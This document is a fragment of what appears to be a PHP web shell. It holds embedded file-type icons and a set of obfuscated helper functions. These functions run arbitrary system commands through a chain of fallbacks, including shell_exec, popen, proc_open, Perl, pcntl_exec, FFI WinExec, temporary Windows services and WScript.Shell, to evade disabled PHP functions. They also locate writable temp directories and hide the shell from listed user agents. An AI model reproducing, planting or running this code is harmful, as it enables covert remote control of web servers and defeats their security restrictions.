 "cpp"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGnSURBVDiNlVIxSxxBGH0zfncrd5oDN3AEUhwJZyFcTBPShqC1IvgLhOQPxN42YJFKQjoLsZBUKZIiaRZSLZFkPDHuNmfnFRdOPIw3881Mqj1Z16D3wWvefO/xvceIOI4XmXnTOfcEY4yUUhHRGxFFkWo0Gq16vQ4p5Z3Ezjl0u110Op0D0lq3wjCE1nqcAxCGIZIkaZG1FtbascQAkOmImeG9zz3+Sob4Fl+g22OUSGDuURnLL6ZQmcxHZGZIYwy89yP8OLrE+499BCVgdWEKi88r2P89xNZeP7fnvYcxBmStzV3w+fsA0xWB1ys1ZJ0+uD+Bs4GFcx5C5GMUIpycajydDSCER0Y/fkgACMAVl0UoGDAD2vhCLzcNM0NmBhnqMxIqHcKwG3E/jy+x9/Uc2rjc7o0GKy+rOO0ZbHzoIdq/wKdogLfbfxAf/sWERMGgEGG+WcbGqxnsfDnHu90+yiWBZ3MB1pbu3a2DzGS+GRYyX98bGRhjQES3lnZdzMyQRJQopaC1LnyU/0FrDaUUiCiharW6nqbpZrvdbo5zQRAEaa1WW/8HGgtKKBMv8f4AAAAASUVORK5CYII=",
 "h"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFkSURBVDiNlZIxbttAEEUfV+OoUKGChVohQAA38hnSuHbnO7iPD5DeB8hBcgKVkd3QQmRQgKHKgNwZSEEuZ3ZSMLIpUwmiD0yxmP2D/+dPtlgszlX1JqV0xhEIIRQi8iWbz+fFdDqdTSYTQgj/RU4psd1u2Ww29xJjnOV5TozxGAHkeU5ZljMxM8zsKDLAjhdUFXffK0oYXA7gB71et1QVaZqmJXWh4L8cV+/3OmiaBjGz/qcE1ICBN072nOETh0HfhuwsvB/gtcMtyFeBCvyjo98UPnSEqh7egSdvFTxB/B6xKyNbZWR3WX8HBxVYq8A+Gx4cmxmhDvjL/k56CngAr/x1Bx46ydTg1k9hb8DJxQk8gifHa38j7N56IMauhepn9eZi9ee4HPzUqVbV67trQVS1zVPkr3kfgqq2FkSkLIqCGOM/r65bMUaKokBEShmNRtfr9fpmuVx+OkbBcDhcj8fj698AUnPo+XFYhgAAAABJRU5ErkJggg==",
 "java"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIPSURBVDiNlZPPaxNBGIafncxumsa0lqUGxGAUrCKpgiIBrYKCFDz0Us/+BfUi9uJd6KHqQQ/qP+DFiwURepHGg0IO2jTQmoiWYrUpUvs76czsrIfQQNttwRfmMDPv+/B93zBOsVi8aYwZtdae4z8khChJKe87hUKhlM1me9PpNEKIaHPhGfbaUGtvraVWqzE7OzsllVK9vu+jlIoMO6u/8Ra/stVo7Dj3fZ9KpdIrgiAgCALCMNyz2Fii7d0D9MU7iJ+fd9xt54QxJjr8d47E2F10Jo/34QnOyvwejzEGqbVuBnaprfgSdeI63vQY9f6HBOmzsMuntUbsV34YS2APHSFM+YjF6UjPgS1s9t1DfpvA+KcRS9+bVW5t7G1hG7Ct+JdXeDPj6MwldCaPO/cJm+zGm3xNbKGEWFtgffAFQDRAZ/LE5ichUDiNZdTxyxBPoU5eJS4EXnW85Y8EmK4s5tgFvJm3OFYRugmC1FHY+ANBg9WBp61hRgLEeg3rdSDWauC6OPVlwjDG1pUbhInDTdN+gI43Q8hfU6gz/dRzgyBcsBYn2CT5fgRH1VHZPhrnb+8EaK2RUrJ66xGxpR+0f3xOW3UCJ7SETgxCS9jeRZDqxvjZ1gsYY5BSykqpVOrJ5XK4rovt7mFl4HHkv2gNWinK5TJSyopMJpPD1Wp1tFwunzowtUvxeLza2dk5/A8rQ4uu8K0RngAAAABJRU5ErkJggg==",
 "js"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGZSURBVDiNlZKxa1NRFMZ/93IhlhQjfUKQog2COEWnKDgK3aKj6OBf4OJg/4FOgtl0sLgJWXUXRIgFh1CQZ1xeBoNQIeKg4uJ9557jUKt9pkZz4Gzf9zvnu+e64XC4LiI9VT3HAuW9z0MId9xgMMhbrVa72Wzivf8vs6oynU6ZTCZvQoyxnWUZMcZFFiDLMoqiaIeUEimlhcwA+74gIpjZwgAAEcGXZYmZ/e6v7/Fbq/BpBLvbuKdX8I9a+P4F+Pi6oi3LkpBSqm5gYNFharhXPWz5JOn6Fu7zO6y2Age0h0dQ+wkAlk7hime4mLCzV7ETnQpARPD7gF+thn3f2yCt3yNdvouVDvfkFuw8rmgPBxho9KgCO3302GnSpdtoOI59+zIDmIngdt9iegQ7ugof+rjnD0AFXetg56/NRKgA/Iv7uJcPsc4NrLaMdTehu1m93TyAtrvYxZuw1KgI5/2DICJ79wwBW1mbmTLPLCL4EEKR5zkxxj8e8+8dYyTPc0IIRajX6xvj8bg3Go3O/HPsgarVauNGo7HxAwJPUB9huYnSAAAAAElFTkSuQmCC",
 "py"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJkSURBVDiNlZO9a1NRHIafe+65uflo2tigKVgxUq0gbUUcREQ3cfALHN0EK66CHVzcXMTJ2X/Af8DJwVYqQqWWNFSbKNaKH63VmCa9yT3n3HscNBeli77z8z783uHnzM3NnTbG3IvjeIL/iBCiIqW86czMzFTK5fJ4qVRCCPFP5TiOWVtbY2VlZVEqpcaLxSJKqQR49PwVzxbf4gqBUhqtFdcunmR071DCFItFarXauIiiiCiKsNZiraXRCpivf+bUkYNk8gUcv4/1AO4/fJww1lp6PWmMwVoLQLPdYW7pHZtByHRllVani47gR6CxTifhejHGILXWWGt58vINs6+/0OxEbHZjgkaTTjdEOR6trqE/FRK+uA64iNEbyPwIWmtE7/zpxVUqGw5LGxEfWoKvyqNFFhUJsukMGbYoFPawM1wgrN5NZiQTgtCg4gyu9PBcS9T4hI/CcyDrhlwafY8XZSBSEDWw1v6a0BNopcBxSPk+pcY8t868YyjXxuouKdcl7wtoLEMUEMdsF6SFxrcWwk0uT7zn0Ege2uugO6DasNUC3QXhEWqPzG+B6AmunjvOfucjO7of2NXXBrOMdbZotjb4sdWioX2+iTKrqowdOrv9guHSILcnLwCgl2Yh0wcyhacjYiNofFcEg1fonzhBxu/fLvgzOs5DLotjArLpAmvNo8TBU/p2H8NN5RM+EWitkVImAnd4klrlAdKzxFZi1AJix3nS6cJfZWMMUkpZq1Qqo2NjY3ieB4DM76P/8J1tT9Qra62pVqtIKWsyl8tN1ev1e9Vq9cA/veLv+L5fHxgYmPoJJsCGQPCg5+wAAAAASUVORK5CYII=",
 "diz"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAD9SURBVDiNzVCrjoRAEKyddIJAIEZgMSc5D34TFF9z+xf7NQgMDoHBzaHAYPmFmZ7hxIXN7oYhh7tOKun0o1JVl77vr8x8d8594kQJIRQRfV3atlVJkqRxHEMI8adn5xyWZcE8z9+ktU6llNBanxEAKSXGcUzJWgtr7alnANj+iJmxruvuUdd1AIA8z3f3zAwyxngJtrlvb4wBWWu9B1mWHRIcWqiq6tGXZem1IDaCdxRF8WJlD8zsV/A881n4HwTeDJqmeRzWdX2cgTEGRPTC/hzingpm/lVARKNSClprb9rv0FpDKQUiGikMw9s0TfdhGD52jXoqCIIpiqLbDyVJHq338QJuAAAAAElFTkSuQmCC",
 "cmd"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHiSURBVDiNlZK9a1NhFMZ/933P/Qgp6XDFki2LLjZFdKoEWpBY/4Vg/oNSFPuRbiKunaWEqhQRcZdOQrldHKJLkikB6dpF7VAJyfu+1yFfHXsPnOXA+Z3nPDxeq9WqGmMOnHMrZCilVFtEdryzs7N2qVQqLy0toZS60bJzjouLC87PzzsyHA7LcRwzHA6zCCCOY3q9XlmstdRqNZIkyQRYW1tjc3MTZYzJvAyQJAnGGNRoNJoNC4VCJshoNEJZa2eDTqdDo9GgUCjgeQqtNFoLon1E+2gtaKXxvLHZ1trxC9OqP6uzuvqIdrvDfmOfW/FtoiBHFE46yBEGOaIgIgwijDGIMQalNKKFH62f1Gt1tp5v0djfo1gs8vrVGzw8AFJS0jTFOYdL7RzgS4BooVKpsL3zkvJKmaPmO94fHRMFOZgAIMWlbgxw1wCiBRGf448f+PzpC9sv9rj8c4lSQhjk8LyJgul1Z7DXAQCihMfrG/z9fYmI4PshyfdvLCzkZx6tPlgfX7YaM7iaA6obVU6+nvDv1xVq4rxWmvv3HqKUnkV8Kt06y5On1Tng8PAtURRlysBgMKDZbCIi0js9Pb27vLyM7/s3DlC320VEepLP53f7/f5Bt9u9k0VBGIb9xcXF3f+O+N/4FuZWJwAAAABJRU5ErkJggg==",
 "xml"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAHGSURBVDiNlZLPSlthEMV/98t3c4PBXJtbSCEg2RQkNN34DC5cuOgL+BT1LXwAX6R7CegmReE2tHAjKsQ/pCuDBsn3504XMTeNLaUZmMUMZ86cOUzQ6/V2nHOHeZ5/ZIVQSqVa689Bt9tNW61Wp9FooJT6r+E8zxmNRlxfX3/TxphOkiQYY1YRQJIkZFnW0d57vPcrDQPM57RzDhF5pVFABQAEE0NgPXmtUvTm4ZxDWWsRkSLLJ1eou3FRV758R/fvUXdjyidXS1hrLcp7XzSi7iXh+S2+vjZT9WzRP0aYdgNfXyM8vyXqXhZ47z1qfkJ0fEF4NuRxf5s8KiEihP17/NsqPq6QRyUe97cJz4ZExxeICM65hQfB0xQBpBQUnoRfh5jOu4VHpQCBGfaFoFAw2d3Cbm6wfnQKU0cwfkZnP5nOCaaO9aNT7OYGk92tPwlEhMleG9uMUTcPlHtDbKuOr5YREdTNA7YZM9lrF/ilE+bx9OkDgfWIVovtgGvWsK038Bv2rwQAohV5s/ZSSNHjFa4gsNaitV7pE51zMw+01lmaphhjlp7kX2mMIU1TtNaZrlarB4PB4LDf779fRUEURYM4jg9+AY0DZ4cpAUR4AAAAAElFTkSuQmCC",
 "avi"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAJgSURBVDiNlZO9bhtHFIW/mZ2d3RVXJEs1hBMYCQtFhhYp1QgR8g58Cbmy38JurJcI8hCBmq0JxEVAG8gP1KiUREhczp2fFLMJbHe+7WDunHO+M+ri4uJn7/0bpdSLl9/8RdFU6MpS2BJVGgCSeIIT4t4Rdnve/f0tKaXfjTGvzG63e9v3/cnl5SU/Pj+ksBZdlejSoAqdF4RIFE/cC8E5fmifcXV19eLs7Oyt8d6frFYr7u7ueAjvsbWlqPLrSo8LYswq9oIbHB//dKxWK7z3J+r09DSt12vOz8/5mrm+vqbrOtTx8XGazWYAXJ38Q12XaGvRpYbRAiESJRKdYxiEy/fPALi/v0d77+n7HhHhcFJStzXNtKaZTTiYtxzMW5rZhGZaU7c1h5MSEaHve7z3GO89XdcBoKuSorYUTZ1pjBSieMJuP+YREBG6rsN7jxYR1us1IoIqCpQp0KWhqCxle0DZHlBUNlMxBaoo+PSO8d6zXC6z16RIMZFSIsWM7n8KKZFigpQQEZbLZVbgvWez2SAimbUIcXD4pwHZPiLbR/zTQBxcPhOPiLDZbHIGIQQWi0UOe1CgFMSEHi3lIoWcw94RBodIYrFYEELIFm5ubjg6OmL/lLCjdG2Kz4oUfSA6wQ2CiOL29pb5fI5q2zZZa7+qRP+Ncy4r2G63TKdTfltNqJsKbUt0WXzxF7KCYbfnp18eeXh4oGkaTAjhQ1VV32utmR3WuQO1RdsSZcYMRvlhcFRGIXJHVVWklD6YGOPrGOMbpdR3v/7xhLYeXRp0WX6hYKTkHM45Ukoftdav/wWP7nOnXPYUNgAAAABJRU5ErkJggg==",
 "xls"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAGUSURBVDiNjZMxa9tAGIbfyAeOAo1iuFsEJmA56RS62SZLfkTH/IpCO5bQIT8he5f+hC79A7ZXBZo0NhmkRcQKpJAW4/vuvgzNXSTbSXogEJ907/O8J7Tx7Xv6YZLPTsu7PyEAHB8pWGvx2gqCIBVCfNz4fPbj79abVrjbjtFoBHh/qMDML24mIuR5jqIozkVR/g7ftfdxXcxhmaH1DojoVYM4jpFl2YEgY3B7b2AfqcwMZsZwOAQAKKUwm838RqUUut0umBnGGAhDBDJPnV3AYDDwsyRJanRXkYggiAyqZ+YCptOpJ1ctnAEAaK0hjCWvXw1JkqRGrt47g8cKBtZy7SEzYzQa1ehKqZUqRARhjIGpCLiAfr/vZ51Op0ZeCqCawboXn1veoHoGzmA8HvuZlBIAUJYlpJS+ylPAmq/Q6/VWiMtV/gXQ+grOQErpyXEcIwzD1QqaCEFDPGvgyMt0IkIgW9vzm+wnSGtYyz7gpWuxWCBNUwghrsTbvfjLxa/85HJ0sQkAX3X0Xz9Ts9mcRFH06QFIsTx57QMZyQAAAABJRU5ErkJggg==",
 "pl"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAsBJREFUOMuV08trXHUUwPHv73fvzJ1H53HlJmPStE2tdtEmXVhfzVSqkNpShCClCykFl26KG/sXdFtw5cKl/hlCDQQVbSjVzlhkZiCTKiZjJzWTed7f79x7uwg0uBDs2R7O5zzgqPX19YsicieO4zO8QGitH7qu+7laW1t7OD8/v1ipVNBa/6/iOI7pdDq02+2aa4xZzOZyDIZDtNZorVGA0hqlFGq/HSpJUEoBkCQJQRDQaDQWdRRFaKWeJ8UKe70uYi3j0ZA/278hJtyHlQKlcBwHx3GIoghXREAptNYYY2g3f6X7+HuOn77MXq/DaHeDbGGKIKhgrWXQ3yHlFTiUzyMiuNZalNaEkwl7vS6FvGXq7AW8NKR0hlL+KGawyZNEYSY9vrz9KUsXr1Bd/gRrLW4URYgxdDp/ED59hCQJo40uM4ePYCd9lNY4Toqdxz+w3XpA9Y1XmTvxNp6XPVhhPB6x0bhPOtzk/i8NHt37juMnXmEmKDCcJISDp7x54RLbm7/jV6aYO3aKYrGIiKBFBGMMg94OX3/1De9evsH1z74At8zdn/7m27v3KB95nQc//4ibzlI5uUy5VMJxnP0biAij0YBWbZ3Fd85z6swSmUyGs0uX2P6rze2bH/H+1Zvkc4fIZLMUij6e55EkyQFgJmOiOOGDD6+Ty+XwPA+lFKN+l/PvnWP28DEKhSJxHBPHMdbafwNpL8Nbyx8j4ycYY0in0ziOgx8cpVAsISJYa7HWIiJEUYRS6gB4eWaOXC5DEgsiwnA4JI5jCqWXOH3uGmKFwWBAq9Xin91dZmdnMWF4ABSLRcplHxH7fHylFL7vMz09TRiG9Pt9tra2WFlZoVar4fv+PuC6bmN1dfXkwsICqVTqPx9IKUW1WqXb7RIEAfV6Hdd1G24+n7/VbDbv1Ov1117knT3Pa5ZKpVvPANPKWvOoFTopAAAAAElFTkSuQmCC",
 "htaccess"=>"iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAN1wAADdcBQiibeAAAAmFJREFUOMuV089LVFEYxvHvvXOuMzU69zZjlpWl+StzjBTLCAoljSL6sQiDVi2CNhFBSdtwFSK1rL+goCBoaQaGJBWTSONUNpOTlZFTQVZq051z7mkhKaQGvvAuz4fnOfAasVisTUrZ7XneNpYxpmnGhRAXjf7+/nhRIFaHOUl4RRMF4V2ISAhtgIGx6GPP88hkMoyNjQ0L13Xr8go8PqeG+DqUxhkboehoFH9TNUbYwTDFokgkEiGZTNYJpRROyUHM9DdGHnzkSSxDVd8kVXsShA9XYbU04LNDCwClFEopTCklPqsEu+Ik5WsqsXwh7kyEuXlXMnFpgFzXbdxUGq31gpVS4mtvb79cWlqKYYcwNzgY76axxhWDmIxMSza++Elo+CXaFpiVxaDn/yWdTmMqpWZFNIGdFUTPlXGg+hOHPD9fzHV0/Zph8JHF7ys95Hp78JQ7l2CuwnwssFq2s6qzmeaaUU6rH4SNzVwzvjGQXEu28zGq7yHay81V+AfQaG1gtuwgcPUIFVXvOaY8HKOG6ypLb6KeyRuvUB/G0Z63FDC7vsYowfPNbHHe0irzyZnl3MqzePO0COPeM/DU/wG0xjy+l+CpKPX+UXbLMJNelqGpDF/iU2Rnsv8HtNZoD8SZVkpOFNNmvSZqOPRt+sn9xgifsy5SSsRfYKnRThDrwj7KC5+z/7uffruQrD2DszIwD+RyOYQQSyJqdT7Bs000uJLS6fUMx2Lo3GwCUwiRjMfjuK67dBWt0X4fth2grLiYrbW1DCcSCCGSIhgMdqRSqe5EIlG5nHP2+/0p27Y7/gDPzYj0H4o5FQAAAABJRU5ErkJggg==",
);

/* functions */
 function z7z($i, $k=''){ global $config; $m=array("version","auth","default_vars","banned","use_buffer","visual","reg_interesting","reg_bad"); if(!@isset($m[$i])) return ''; return ($k!='') ? (@isset($config[$m[$i]][$k]) ? $config[$m[$i]][$k] : '') : (@isset($config[$m[$i]]) ? $config[$m[$i]] : ''); } function z3g($i,$t){ if($t!='d'&&$t!='f'&&$t!='l'&&$t!='e') return ''; if($t=='l'||$t=='e') $t='f'; $cs=z9q('reg_self'); $ci=z9q('reg_interesting'); $cb=z9q('reg_bad'); if($t=='f' && $i==@basename('index.php')) return (($cs!='') ? ' style="color: '.$cs.'";' : ''); foreach(z7z('6',$t) as $r){ if(@preg_match('/'.$r.'/i', $i)) return (($ci!='') ? ' style="color: '.$ci.'";' : ''); } foreach(z7z('7',$t) as $r){ if(@preg_match('/'.$r.'/i', $i)) return (($cb!='') ?' style="color: '.$cb.'";' : ''); } } function z6h(){ $i=@ini_get('disable_functions'); if($i!=''){ $f=@array_map('trim',@explode(',',$i)); @sort($f); return $f; }else{ return array(); } } function z9q($i){ global $color_skin; $a=z7z('5', $color_skin); return @isset($a[$i]) ? $a[$i] : ''; } function z9s(){ if(@isset($_SERVER['HTTP_USER_AGENT'])) { if(@preg_match('/'.@implode('|', z7z(3, "agents")).'/i', $_SERVER['HTTP_USER_AGENT'])) { @header(z7z(3, "send_header")); exit(0); } } } z9s(); function z9y($k, $w='',$u=0){ global $lang; $l=z7z(2, "language"); $r = ''; if(!isset($lang[$l][$k])) return "?"; $r = $lang[$l][$k]; if($w!==''){ if(@is_array($w)){ for($i=0; $i<@count($w); $i++){ if(@isset($w[$i])) $r = @str_replace("[%".($i+1)."%]", $w[$i], $r); } } else { $r = @str_replace("[%1%]", $w, $r); } } return ($u? @strtoupper($r) : $r); } function z9p(){ $o=''; if(@defined('PHP_OS')){ $o=PHP_OS; }elseif(@function_exists('php_uname')&&@is_callable('php_uname')){ $o=@php_uname('s'); } return !@empty($o)?$o:"*NIX"; } function z6v(){ $i=@get_included_files(); return (@count($i)>0) ? ($i[0]!='index.php') : 0; } function z9a($d,$s=':'){ if($d!=''){ if(!@strstr($d,$s)) return array($d); return @array_map('trim',@explode($s,$d)); } return array(); } function z9i($i){ foreach(array("a"=>"4","e"=>"3","o"=>"0","s"=>"5","l"=>"1","t"=>"7") as $k=>$v){ $i=@str_replace(array($k,@strtoupper($k)),$v,$i); } return $i; } function z3n(){ $wwwdir=false; if(@isset($_SERVER["SCRIPT_NAME"])) { $sn=z1j($_SERVER["SCRIPT_NAME"]); if(@realpath($sn)){ $sp=z1j(@realpath($sn)); } else { $sp=z1j(@realpath('index.php')); } $wwwdir=z1k(@substr($sp,0,@strpos($sp,$sn))); } return $wwwdir; } function z6j(){ global $win; $s='/'; $tmp = array(); $tp = array(); $tn = array('/tmp/','/dev/shm/','/var/tmp/'); $tw = array("%WINDIR/temp/"); $ti = array(@ini_get('session.save_path'), @ini_get('upload_tmp_dir')); $te = array('TMP', 'TMPDIR', 'TEMP'); if($win){ foreach($tw as $t) $tp[] = $t; } else { foreach($tn as $t) $tp[] = $t; } if(@isset($_ENV)){ foreach($te as $t){ if(!@empty($_ENV[$t])) $tp[] = @realpath($_ENV[$t]); } } foreach($ti as $t){ if(!@empty($t)) $tp[] = $t; } $b=z9a(@ini_get('open_basedir')); if(@count($b)>0){ foreach($b as $t){ if(!empty($t)) $tp[] = $t; } } $tp[]=@realpath(@dirname('index.php')); for($i=0; $i < @count($tp); $i++){ if(!@empty($tp[$i])){ $p=@str_replace('\\', $s, $tp[$i]); if(@substr($p, -1, 1) != $s){ $p .= $s; } if(!@in_array($p, $tmp)){ $f=@md5(@uniqid(@time())); $fp=@fopen($p.$f,"w"); if($fp){ @fclose($fp); if(@file_exists($p.$f)){ @unlink($p.$f); $tmp[] = @trim($p); } } } } } return (@count($tmp)>0) ? $tmp : array("./"); } function z9o($f){ global $nix, $sh_exec; $r=''; if(z7e('fopen')&&z7e('feof')&&z7e('fgets')&&z7e('feof')&&z7e('fclose') && ($fp = @fopen($f, 'r'))!==false){ while(!@feof($fp)){$r .= @fgets($fp);}; @fclose($fp); }elseif(z7e('fopen')&&z7e('fread')&&z7e('fclose')&&z7e('filesize')&&($fp = @fopen($f, 'r'))!==false){ $r = @fread($fp, @filesize($f)); @fclose($fp); }elseif($nix && $sh_exec){ $r=z9e('cat "'.$f.'" 2>/dev/null',0); }elseif(z7e('file')&&($fl = @file($f))){ foreach ($fl as $l) { $r .= $l; } }elseif(z7e('file_get_contents')){ $r = @file_get_contents($f); }elseif(z7e('readfile')){ $r = @readfile($f); }elseif(z7e('highlight_file')){ $r = @highlight_file($f); }elseif(z7e('show_source')){ $r = @show_source($f); } return $r; } function z9u($f,$t=''){ global $tempdir; $s=''; if(!$t) $t=@tempnam($tempdir,"copytemp"); if(@copy("compress.zlib://".$f,$t)){ $s=z9o($t); @unlink($t); } return $s; } function z9t($t,$s=''){ if(z7e('fopen')&&z7e('fwrite')&&z7e('fclose')&&($f=@fopen($t,"wb"))!==false){ @fwrite($f,$s); @fclose($f); }elseif(z7e('fopen')&&z7e('fputs')&&z7e('fclose')&&($f=@fopen($t,"wb"))!==false){ @fputs($f,$s); @fclose($f); }elseif(z7e('file_put_contents')){ return @file_put_contents($t,$s); } else { return 0; } return 1; } function z7e($f){ return (@function_exists($f) && @is_callable($f) && !@in_array($f, z6h())) ? 1 : 0; } function z3x($v) { if($v == '') return 'no value'; if(@is_bool ( $v )) return $value ? 'TRUE' : 'FALSE'; if($v === null) return 'NULL'; if(@is_object($v)) $v =(array) $v; if(@is_array($v)) { @ob_start (); print_r ( $v ); $v = @ob_get_contents (); @ob_end_clean (); } return (string) $v; } function z6k($i){ return (z7e('escapeshellarg')) ? @escapeshellarg($i) : $i; } function z9e($c,$h=1) { $r = ''; if (!empty($c)){ if(z7e('shell_exec')) { $r = @shell_exec($c); } elseif(z7e('system')) { @ob_start(); @system($c); $r = @ob_get_contents(); @ob_end_clean(); } elseif(z7e('passthru')) { @ob_start(); @passthru($c); $r = @ob_get_contents(); @ob_end_clean(); } elseif(z7e('exec')){ @exec($c,$r); $r = @join("\n", $r); } elseif(z7e('popen') && @is_resource($f = @popen($c,"r"))) { if(z7e('fread') && z7e('feof')){ while(!@feof($f)) { $r .= @fread($f,1024); } }elseif(z7e('fgets') && z7e('feof')){ while(!@feof($f)) { $r .= @fgets($f,1024); } } @pclose($f); } elseif(z7e('proc_open') && @is_resource($f = @proc_open($c,array(1 => array("pipe", "w")),$p))) { if(z7e('fread') && z7e('feof')){ while(!@feof($p[1])) {$r .= @fread($p[1], 1024);} }elseif(z7e('fgets') && z7e('feof')){ while(!@feof($p[1])) {$r .= @fgets($p[1], 1024);} } @proc_close($f); } } else { $r = z6c($c); } return ($h?@htmlspecialchars($r):$r); } function z6c($c) { global $win,$tempdir; $r = ''; if (!empty($c)) { if(!$win){ if(extension_loaded('perl')){ @ob_start(); $p=new perl(); $p->eval("system('$c')"); $r = @ob_get_contents(); @ob_end_clean(); }elseif(z7e('pcntl_exec') && z7e('pcntl_fork')) { $r = '[~] Blind Command Execution via [pcntl_exec]\n\n'; $o=$tempdir.uniqid('pcntl'); $pid = @pcntl_fork(); if ($pid == -1) { $r .= '[-] Could not fork. Exit'; } elseif ($pid) { $r .= (@pcntl_wifexited($status) ? '[+] Done! Command "'.$c.'" successfully executed.' : '[-] Error. Incorrect Command.'); } else { $c = array(" -e 'system(\"$c > $o\")'"); if(@pcntl_exec('/usr/bin/perl',$c)) exit(0); if(@pcntl_exec('/usr/local/bin/perl',$c)) exit(0); die(); } $r=z9o($o); @unlink($o); } } else { $o=$tempdir.uniqid('NJ'); if(extension_loaded('ffi')) { $a=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);"); $r=$a->WinExec("cmd.exe /c ".z6k($c)." >\"$o\"",0); while(!@file_exists($o))sleep(1); $r=z9o($o); } elseif(extension_loaded('win32service')) { $s=uniqid('NJ'); @win32_create_service(array('service'=>$s,'display'=>$s,'path'=>'c:\\windows\\system32\\cmd.exe','params'=>"/c ".z6k($c)." >\"$o\"")); @win32_start_service($s); @win32_stop_service($s); @win32_delete_service($s); while(!@file_exists($o))sleep(1); $r=z9o($o); } elseif(extension_loaded("win32std")) { @win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.z6k($c).' > "'.$o.'"'); while(!@file_exists($o))sleep(1); $r=z9o($o); } else { $a = new COM("WScript.Shell"); $a->Run('c:\\windows\\system32\\cmd.exe /c '.z6k($c).' > "'.$o.'"'); $r=z9o($o); } @unlink($o); } } return $r; } function z10e(){ list($u,$s)=@explode(" ",@microtime()); return ((float)$u+(float)$s); } function z4m($c,$i){ $a=array( '0'=>array('container','login','footer','headnfo','ql','nav','sinfo','tfilter','tahex','phpinfo'), '1'=>array('list1','list2'), '2'=>array('lerror','topcf','topt','topc','tdfooter','tdql','tdsinfo','tdlsh1','tdlsh2','tdlsf','tdlsfn','tdfilter','tdhead','tdph','tdpl','tdlbl','thex1','thex2','thex3','tdlsf1','tdmail'), '3'=>array("scroll","selector","divls","dwidth","barbg","barfil"), '4'=>array('size1','size2','size3','size4','size5','size6','size7','size8','size9','size10'), '5'=>array('links','slinks','button','head','ql1','ql2','but1','but2','but3','fimg','dirlist','filelist','ftactive','ftcompat','ftother','qlback','mbut1','mbut2','actbut'), '6'=>array('console','tgeneric','tedit','txmail','tsql1','tsql2','tinj'), ); return (@isset($a[$i][$c]) ? $a[$i][$c] : ''); } function z7w($a='',$c='',$s=''){ return '<table cellpadding="0" cellspacing="0" border="0"'.(($a!='')? ' align="'.$a.'"': '').(($c!='')?' class="'.z4m($c,'0').'"': '').(($s!='')?z10r($s):'').'>'."\n";} function z9m($c='',$s=''){ return z7w('',$c,$s); } function z7r($c='',$s=''){ return z7w('left',$c,$s); } function z7d($c='',$s=''){ return z7w('right',$c,$s); } function z7g($c='',$s=''){ return z7w('center',$c,$s); } function z10q(){ return '</table>'."\n"; } function z10w($i,$c='',$s=''){ return z9m($c,$s).$i.z10q(); } function z7h($i,$c='',$s=''){ return z7r($c,$s).$i.z10q(); } function z7s($i,$c='',$s=''){ return z7d($c,$s).$i.z10q(); } function z7a($i,$c='',$s=''){ return z7g($c,$s).$i.z10q(); } function z7y(){ return '</tr>'."\n"; } function z6d($v,$c='',$id=''){ return '<tr valign="'.$v.'"'.(($id!='')?' id="'.$id.'"':'').(($c!='')?' class="'.z4m($c,'1').'"': '').'>'."\n"; } function z7t($i,$v,$c='',$id=''){ return z6d($v,$c,$id).$i.z7y(); } function z9d($i,$c='',$id=''){ return z7t($i,"top",$c,$id); } function z7u($i,$c='',$id=''){ return z7t($i,"middle",$c,$id); } function z7p($i,$c='',$id=''){ return z7t($i,"bottom",$c,$id); } function z7o($c='',$id=''){ return z6d("top",$c,$id); } function z6f($c='',$id=''){ return z6d("middle",$c,$id); } function z5c($c='',$id=''){ return z6d("bottom",$c,$id); } 